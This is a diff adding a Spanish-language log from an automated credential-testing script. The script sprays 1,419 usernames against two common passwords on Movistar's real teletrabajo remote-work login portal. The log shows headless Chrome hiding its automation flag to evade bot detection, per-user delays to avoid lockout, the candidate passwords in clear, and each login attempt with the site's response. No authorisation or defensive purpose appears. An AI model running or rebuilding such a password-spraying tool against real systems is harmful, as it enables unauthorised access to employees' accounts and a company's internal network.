@@ -1,0 +1,183 @@
+2025-10-04 10:38:35,999 - [MainThread] - INFO - ======================================================================
+2025-10-04 10:38:36,001 - [MainThread] - INFO - 🚀 VALIDADOR MASIVO DE CREDENCIALES - TELETRABAJO MOVISTAR
+2025-10-04 10:38:36,001 - [MainThread] - INFO - ⚡ Modo: Multi-threading con rotación de usuarios
+2025-10-04 10:38:36,002 - [MainThread] - INFO - ======================================================================
+2025-10-04 10:38:36,003 - [MainThread] - INFO - 📅 Inicio: 2025-10-04 10:38:36
+2025-10-04 10:38:36,004 - [MainThread] - INFO - 
+======================================================================
+2025-10-04 10:38:36,005 - [MainThread] - INFO - 📂 CARGANDO ARCHIVOS CSV
+2025-10-04 10:38:36,006 - [MainThread] - INFO - ======================================================================
+2025-10-04 10:38:36,021 - [MainThread] - INFO - ✅ 'credenciales.csv' leído - Encoding: utf-8, Separador: coma
+2025-10-04 10:38:36,021 - [MainThread] - INFO - 📋 Columnas encontradas: ['usuario;password']
+2025-10-04 10:38:36,037 - [MainThread] - INFO - ✅ Cargados 1419 usuarios desde 'credenciales.csv'
+2025-10-04 10:38:36,040 - [MainThread] - INFO - ✅ 'contraseña.csv' leído - Encoding: utf-8, Separador: coma
+2025-10-04 10:38:36,042 - [MainThread] - INFO - 📋 Columnas encontradas: ['Telefonica#2025']
+2025-10-04 10:38:36,047 - [MainThread] - INFO - ✅ Cargados 2 passwords desde 'contraseña.csv'
+2025-10-04 10:38:36,049 - [MainThread] - INFO - 
+📊 ESTADÍSTICAS:
+2025-10-04 10:38:36,053 - [MainThread] - INFO -    👥 Usuarios: 1,419
+2025-10-04 10:38:36,056 - [MainThread] - INFO -    🔑 Contraseñas: 2
+2025-10-04 10:38:36,058 - [MainThread] - INFO -    🔢 Total combinaciones: 2,838
+2025-10-04 10:38:36,059 - [MainThread] - INFO -    ⏱️ Tiempo mínimo entre usos del mismo usuario: 15 minutos
+2025-10-04 10:38:55,246 - [MainThread] - INFO - 🔀 Configurado para usar 2 navegadores en paralelo
+2025-10-04 10:38:55,264 - [MainThread] - INFO - 📂 Checkpoint cargado: Usuario #100, Password #100
+2025-10-04 10:39:03,462 - [MainThread] - INFO - 
+🎯 Preparando combinaciones...
+2025-10-04 10:39:03,465 - [MainThread] - INFO - ✅ 2,838 combinaciones preparadas para procesar
+2025-10-04 10:39:03,466 - [MainThread] - INFO - 
+🏁 INICIANDO PROCESAMIENTO PARALELO
+2025-10-04 10:39:03,467 - [MainThread] - INFO - ⏱️ Tiempo estimado: ~3.2 horas
+
+2025-10-04 10:39:03,469 - [ThreadPoolExecutor-0_0] - INFO - 
+======================================================================
+2025-10-04 10:39:03,472 - [ThreadPoolExecutor-0_1] - INFO - 
+======================================================================
+2025-10-04 10:39:03,490 - [ThreadPoolExecutor-0_0] - INFO - 🔄 PROCESANDO COMBINACIÓN #1
+2025-10-04 10:39:03,530 - [ThreadPoolExecutor-0_0] - INFO -    Usuario: melaureanoram;Telefonica#2025 (#1/1419)
+2025-10-04 10:39:03,531 - [ThreadPoolExecutor-0_1] - INFO - 🔄 PROCESANDO COMBINACIÓN #2
+2025-10-04 10:39:03,533 - [ThreadPoolExecutor-0_0] - INFO -    Password: Trujillo#2025 (#1/2)
+2025-10-04 10:39:03,539 - [ThreadPoolExecutor-0_1] - INFO -    Usuario: melaureanoram;Telefonica#2025 (#1/1419)
+2025-10-04 10:39:03,542 - [ThreadPoolExecutor-0_0] - INFO - ======================================================================
+2025-10-04 10:39:03,548 - [ThreadPoolExecutor-0_0] - INFO - ✓ Usuario 'melaureanoram;Telefonica#2025' listo para usar
+2025-10-04 10:39:03,549 - [ThreadPoolExecutor-0_0] - INFO - 🔧 Configurando navegador...
+2025-10-04 10:39:03,551 - [ThreadPoolExecutor-0_1] - INFO -    Password: Telefonica2025# (#2/2)
+2025-10-04 10:39:03,552 - [ThreadPoolExecutor-0_0] - INFO - ====== WebDriver manager ======
+2025-10-04 10:39:03,558 - [ThreadPoolExecutor-0_1] - INFO - ======================================================================
+2025-10-04 10:39:03,564 - [ThreadPoolExecutor-0_1] - WARNING - ⏳ Usuario 'melaureanoram;Telefonica#2025' usado hace 0 min. Esperando 14 min más...
+2025-10-04 10:39:05,734 - [ThreadPoolExecutor-0_0] - INFO - Get LATEST chromedriver version for google-chrome
+2025-10-04 10:39:05,741 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): googlechromelabs.github.io:443
+2025-10-04 10:39:05,831 - [ThreadPoolExecutor-0_0] - DEBUG - https://googlechromelabs.github.io:443 "GET /chrome-for-testing/latest-patch-versions-per-build.json HTTP/1.1" 200 13449
+2025-10-04 10:39:05,862 - [ThreadPoolExecutor-0_0] - INFO - Get LATEST chromedriver version for google-chrome
+2025-10-04 10:39:05,864 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): googlechromelabs.github.io:443
+2025-10-04 10:39:05,911 - [ThreadPoolExecutor-0_0] - DEBUG - https://googlechromelabs.github.io:443 "GET /chrome-for-testing/latest-patch-versions-per-build.json HTTP/1.1" 200 13449
+2025-10-04 10:39:05,920 - [ThreadPoolExecutor-0_0] - INFO - Get LATEST chromedriver version for google-chrome
+2025-10-04 10:39:05,922 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): googlechromelabs.github.io:443
+2025-10-04 10:39:05,969 - [ThreadPoolExecutor-0_0] - DEBUG - https://googlechromelabs.github.io:443 "GET /chrome-for-testing/latest-patch-versions-per-build.json HTTP/1.1" 200 13449
+2025-10-04 10:39:05,974 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): googlechromelabs.github.io:443
+2025-10-04 10:39:06,018 - [ThreadPoolExecutor-0_0] - DEBUG - https://googlechromelabs.github.io:443 "GET /chrome-for-testing/known-good-versions-with-downloads.json HTTP/1.1" 200 112513
+2025-10-04 10:39:06,087 - [ThreadPoolExecutor-0_0] - INFO - WebDriver version 140.0.7339.207 selected
+2025-10-04 10:39:06,095 - [ThreadPoolExecutor-0_0] - INFO - Modern chrome version https://storage.googleapis.com/chrome-for-testing-public/140.0.7339.207/win32/chromedriver-win32.zip
+2025-10-04 10:39:06,095 - [ThreadPoolExecutor-0_0] - INFO - About to download new driver from https://storage.googleapis.com/chrome-for-testing-public/140.0.7339.207/win32/chromedriver-win32.zip
+2025-10-04 10:39:06,098 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): storage.googleapis.com:443
+2025-10-04 10:39:06,274 - [ThreadPoolExecutor-0_0] - DEBUG - https://storage.googleapis.com:443 "GET /chrome-for-testing-public/140.0.7339.207/win32/chromedriver-win32.zip HTTP/1.1" 200 9372476
+2025-10-04 10:39:06,276 - [ThreadPoolExecutor-0_0] - INFO - Driver downloading response is 200
+2025-10-04 10:39:06,929 - [ThreadPoolExecutor-0_0] - INFO - Get LATEST chromedriver version for google-chrome
+2025-10-04 10:39:06,931 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTPS connection (1): googlechromelabs.github.io:443
+2025-10-04 10:39:06,979 - [ThreadPoolExecutor-0_0] - DEBUG - https://googlechromelabs.github.io:443 "GET /chrome-for-testing/latest-patch-versions-per-build.json HTTP/1.1" 200 13449
+2025-10-04 10:39:07,247 - [ThreadPoolExecutor-0_0] - INFO - Driver has been saved in cache [C:\Users\marcos\.wdm\drivers\chromedriver\win64\140.0.7339.207]
+2025-10-04 10:39:07,250 - [ThreadPoolExecutor-0_0] - DEBUG - Skipping Selenium Manager; path to chrome driver specified in Service class: C:\Users\marcos\.wdm\drivers\chromedriver\win64\140.0.7339.207\chromedriver-win32/chromedriver.exe
+2025-10-04 10:39:09,058 - [ThreadPoolExecutor-0_0] - DEBUG - Started executable: `C:\Users\marcos\.wdm\drivers\chromedriver\win64\140.0.7339.207\chromedriver-win32/chromedriver.exe` in a child process with pid: 11576 using 0 to output -3
+2025-10-04 10:39:09,570 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session {'capabilities': {'firstMatch': [{}], 'alwaysMatch': {'browserName': 'chrome', 'pageLoadStrategy': <PageLoadStrategy.normal: 'normal'>, 'goog:chromeOptions': {'prefs': {'profile.managed_default_content_settings.images': 2, 'profile.managed_default_content_settings.stylesheets': 2, 'profile.default_content_setting_values.notifications': 2, 'disk-cache-size': 4096}, 'excludeSwitches': ['enable-automation', 'enable-logging'], 'useAutomationExtension': False, 'extensions': [], 'args': ['--headless=new', '--disable-gpu', '--start-maximized', '--disable-blink-features=AutomationControlled', '--disable-extensions', '--no-sandbox', '--disable-dev-shm-usage', '--disable-logging', '--log-level=3', '--silent', '--blink-settings=imagesEnabled=false', '--disable-remote-fonts']}}}}
+2025-10-04 10:39:09,575 - [ThreadPoolExecutor-0_0] - DEBUG - Starting new HTTP connection (1): localhost:53790
+2025-10-04 10:39:11,504 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session HTTP/1.1" 200 0
+2025-10-04 10:39:11,505 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":{"capabilities":{"acceptInsecureCerts":false,"browserName":"chrome","browserVersion":"140.0.7339.208","chrome":{"chromedriverVersion":"140.0.7339.207 (17230b545fd18b35aad49122e5af97a463bc7a9c-refs/branch-heads/7339@{#2364})","userDataDir":"C:\\Users\\marcos\\AppData\\Local\\Temp\\scoped_dir11576_211288804"},"fedcm:accounts":true,"goog:chromeOptions":{"debuggerAddress":"localhost:53793"},"networkConnectionEnabled":false,"pageLoadStrategy":"normal","platformName":"windows","proxy":{},"setWindowRect":true,"strictFileInteractability":false,"timeouts":{"implicit":0,"pageLoad":300000,"script":30000},"unhandledPromptBehavior":"dismiss and notify","webauthn:extension:credBlob":true,"webauthn:extension:largeBlob":true,"webauthn:extension:minPinLength":true,"webauthn:extension:prf":true,"webauthn:virtualAuthenticators":true},"sessionId":"43d29662828e07ec17e4409986fb77c5"}} | headers=HTTPHeaderDict({'Content-Length': '884', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:11,508 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:11,509 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})", 'args': []}
+2025-10-04 10:39:11,575 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
+2025-10-04 10:39:11,576 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:11,579 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:11,580 - [ThreadPoolExecutor-0_0] - INFO - 🚀 Iniciando login: Usuario='melaureanoram;Telefonica#2025' | Password='Trujillo#2025'
+2025-10-04 10:39:11,585 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/url {'url': 'https://teletrabajo.movistar.pe'}
+2025-10-04 10:39:12,128 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/url HTTP/1.1" 200 0
+2025-10-04 10:39:12,129 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:12,130 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:12,131 - [ThreadPoolExecutor-0_0] - INFO - 🌐 Página cargada: https://teletrabajo.movistar.pe
+2025-10-04 10:39:14,132 - [ThreadPoolExecutor-0_0] - INFO - 👤 Localizando campo de usuario...
+2025-10-04 10:39:14,134 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element {'using': 'xpath', 'value': '//*[@id="login"]'}
+2025-10-04 10:39:14,191 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element HTTP/1.1" 200 0
+2025-10-04 10:39:14,193 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.11"}} | headers=HTTPHeaderDict({'Content-Length': '126', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:14,194 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:14,195 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.11/clear {}
+2025-10-04 10:39:14,266 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.11/clear HTTP/1.1" 200 0
+2025-10-04 10:39:14,267 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:14,268 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:14,269 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.11/value {'text': 'melaureanoram;Telefonica#2025', 'value': ['m', 'e', 'l', 'a', 'u', 'r', 'e', 'a', 'n', 'o', 'r', 'a', 'm', ';', 'T', 'e', 'l', 'e', 'f', 'o', 'n', 'i', 'c', 'a', '#', '2', '0', '2', '5']}
+2025-10-04 10:39:14,405 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.11/value HTTP/1.1" 200 0
+2025-10-04 10:39:14,405 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:14,406 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:14,406 - [ThreadPoolExecutor-0_0] - INFO - ✓ Usuario ingresado: melaureanoram;Telefonica#2025
+2025-10-04 10:39:14,909 - [ThreadPoolExecutor-0_0] - INFO - 🔒 Localizando campo de contraseña...
+2025-10-04 10:39:14,911 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element {'using': 'xpath', 'value': '//*[@id="passwd"]'}
+2025-10-04 10:39:14,950 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element HTTP/1.1" 200 0
+2025-10-04 10:39:14,951 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.13"}} | headers=HTTPHeaderDict({'Content-Length': '126', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:14,953 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:14,954 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.13/clear {}
+2025-10-04 10:39:14,996 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.13/clear HTTP/1.1" 200 0
+2025-10-04 10:39:14,996 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:14,997 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:14,997 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.13/value {'text': 'Trujillo#2025', 'value': ['T', 'r', 'u', 'j', 'i', 'l', 'l', 'o', '#', '2', '0', '2', '5']}
+2025-10-04 10:39:15,097 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.13/value HTTP/1.1" 200 0
+2025-10-04 10:39:15,099 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:15,100 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:15,101 - [ThreadPoolExecutor-0_0] - INFO - ✓ Contraseña ingresada: Trujillo#2025
+2025-10-04 10:39:15,602 - [ThreadPoolExecutor-0_0] - INFO - 🔘 Buscando botón de login...
+2025-10-04 10:39:15,604 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element {'using': 'xpath', 'value': '//*[@id="nsg-x1-logon-button"]'}
+2025-10-04 10:39:15,633 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element HTTP/1.1" 200 0
+2025-10-04 10:39:15,634 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18"}} | headers=HTTPHeaderDict({'Content-Length': '126', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:15,635 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:15,871 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': '/* isDisplayed */return (function(){return (function(){var g=this||self;\nfunction aa(a){var b=typeof...', 'args': [{'element-6066-11e4-a52e-4f735466cecf': 'f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18'}]}
+2025-10-04 10:39:15,887 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
+2025-10-04 10:39:15,896 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":true} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:15,899 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:15,900 - [ThreadPoolExecutor-0_0] - DEBUG - GET http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18/enabled {}
+2025-10-04 10:39:15,923 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "GET /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18/enabled HTTP/1.1" 200 0
+2025-10-04 10:39:15,930 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":true} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:15,932 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:15,936 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18/click {}
+2025-10-04 10:39:16,058 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.18/click HTTP/1.1" 200 0
+2025-10-04 10:39:16,060 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:16,061 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:16,062 - [ThreadPoolExecutor-0_0] - INFO - ✓ Click en botón de login ejecutado
+2025-10-04 10:39:16,062 - [ThreadPoolExecutor-0_0] - INFO - ⏱️ Esperando 4 segundos para verificar resultado...
+2025-10-04 10:39:20,065 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element {'using': 'xpath', 'value': '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span'}
+2025-10-04 10:39:20,121 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/element HTTP/1.1" 200 0
+2025-10-04 10:39:20,122 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34"}} | headers=HTTPHeaderDict({'Content-Length': '126', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,124 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,126 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': '/* isDisplayed */return (function(){return (function(){var g=this||self;\nfunction aa(a){var b=typeof...', 'args': [{'element-6066-11e4-a52e-4f735466cecf': 'f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34'}]}
+2025-10-04 10:39:20,148 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
+2025-10-04 10:39:20,149 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":true} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,150 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,155 - [ThreadPoolExecutor-0_0] - DEBUG - GET http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34/text {}
+2025-10-04 10:39:20,192 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "GET /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34/text HTTP/1.1" 200 0
+2025-10-04 10:39:20,193 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":"Usuario no encontrado."} | headers=HTTPHeaderDict({'Content-Length': '34', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,194 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,195 - [ThreadPoolExecutor-0_0] - ERROR - ❌ Mensaje de error detectado: 'Usuario no encontrado.'
+2025-10-04 10:39:20,195 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/elements {'using': 'xpath', 'value': "//div[contains(@class, 'error')]"}
+2025-10-04 10:39:20,220 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/elements HTTP/1.1" 200 0
+2025-10-04 10:39:20,220 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":[{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.35"},{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.36"}]} | headers=HTTPHeaderDict({'Content-Length': '245', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,221 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,222 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': '/* isDisplayed */return (function(){return (function(){var g=this||self;\nfunction aa(a){var b=typeof...', 'args': [{'element-6066-11e4-a52e-4f735466cecf': 'f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.35'}]}
+2025-10-04 10:39:20,235 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
+2025-10-04 10:39:20,236 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":false} | headers=HTTPHeaderDict({'Content-Length': '15', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,236 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,237 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': '/* isDisplayed */return (function(){return (function(){var g=this||self;\nfunction aa(a){var b=typeof...', 'args': [{'element-6066-11e4-a52e-4f735466cecf': 'f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.36'}]}
+2025-10-04 10:39:20,249 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
+2025-10-04 10:39:20,249 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":false} | headers=HTTPHeaderDict({'Content-Length': '15', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,251 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,251 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/elements {'using': 'xpath', 'value': "//span[contains(@class, 'error')]"}
+2025-10-04 10:39:20,273 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/elements HTTP/1.1" 200 0
+2025-10-04 10:39:20,273 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":[{"element-6066-11e4-a52e-4f735466cecf":"f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34"}]} | headers=HTTPHeaderDict({'Content-Length': '128', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,276 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,277 - [ThreadPoolExecutor-0_0] - DEBUG - POST http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/execute/sync {'script': '/* isDisplayed */return (function(){return (function(){var g=this||self;\nfunction aa(a){var b=typeof...', 'args': [{'element-6066-11e4-a52e-4f735466cecf': 'f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34'}]}
+2025-10-04 10:39:20,287 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "POST /session/43d29662828e07ec17e4409986fb77c5/execute/sync HTTP/1.1" 200 0
